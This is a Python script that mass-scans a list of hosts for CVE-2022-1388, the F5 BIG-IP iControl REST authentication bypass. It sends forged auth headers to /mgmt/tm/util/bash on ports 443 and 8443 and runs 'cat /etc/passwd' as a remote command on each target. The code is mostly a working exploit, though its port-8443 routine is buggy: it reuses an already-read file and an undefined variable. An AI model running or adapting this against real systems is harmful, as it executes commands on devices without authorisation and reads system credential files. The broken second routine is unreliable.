#!/usr/bin/python3
#Created by EvilLizard666

import requests
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

hosts_file_to_scan = open(sys.argv[1], 'r')
headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
        'Content-Type': 'application/json',
        'Connection': 'keep-alive, x-F5-Auth-Token',
        'X-F5-Auth-Token': 'abc',
        'Authorization': 'Basic YWRtaW46'
    }

data = {'command': "run",'utilCmdArgs':"-c cat /etc/passwd"}
def port_443():
    for i in hosts_file_to_scan.readlines():
        i = i.strip()
        check_url = i + '/mgmt/tm/util/bash' 
        try:
            resp = requests.post(url=check_url, json=data, headers=headers, verify=False, timeout=5)
            if resp.status_code == 200 and 'www-data' in resp.text:
                print(i + " [+] VULNERABLE To CVE-2022-1388")
            elif resp.status_code != 200:
                print(i + " [-] Cannot Connect to port 443")
                
            elif resp.status_code == 200 and 'www-data' not in resp.text:
                print(i + " [+] Not Vulnerable using port 443")

        except:
                print(i + " [-] ERROR port 443")
def port_8443():
    for i in hosts_file_to_scan.readlines():
        i = i.strip()
        check_url8443 = i + ':8443/mgmt/tm/util/bash'
        try:
            resp2 = requests.post(url=check_url8443, json=data, headers=headers, verify=False, timeout=5)
            if resp2.status_code == 200 and 'www-data' in resp2.text:
                print(i + " [+] Vulnerable To CVE-2022-1388")
            elif resp.status_code != 200:
                print(i + " [-] Cannot Connect using port 8443")
            elif resp2.status_code == 200 and 'www-data' not in resp.text:
                print(i + " [-] Not Vulnerable using port 8443")
        except:
            print(i + " [-] ERROR port 443")
            
print("[+] Start Scanning on port 443")
port_443()
print("[+] Start Scanning on port 8443")
port_8443()
